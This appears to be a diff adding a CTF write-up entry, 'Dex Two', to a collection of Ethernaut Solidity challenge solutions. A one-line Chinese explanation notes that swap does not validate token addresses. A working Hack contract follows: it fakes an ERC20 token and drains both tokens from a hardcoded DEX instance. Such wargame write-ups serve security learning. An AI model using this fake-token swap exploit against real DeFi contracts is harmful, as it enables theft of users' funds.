@@ -409,3 +409,39 @@ contract Hack {
     }
 }
 ```
+
+## 24. Dex Two
+
+swap函数没有限制from和to的代币地址, 可以伪造代币, 操纵swap价格
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.10;
+
+interface DexTwo {
+    function token1() external view returns (address);
+
+    function token2() external view returns (address);
+
+    function swap(address from, address to, uint256 amount) external;
+}
+
+contract Hack {
+    DexTwo d = DexTwo(0x297F9e9F984136357A772386Cb0c37923f0a24cf);
+
+    function balanceOf(address) public view returns (uint256){
+        return 1;
+    }
+
+    function transferFrom(address from, address to, uint amount) public returns (bool) {
+        return true;
+    }
+
+    function attack() external {
+        d.swap(address(this), d.token1(), 1);
+        d.swap(address(this), d.token2(), 1);
+    }
+}
+
+```
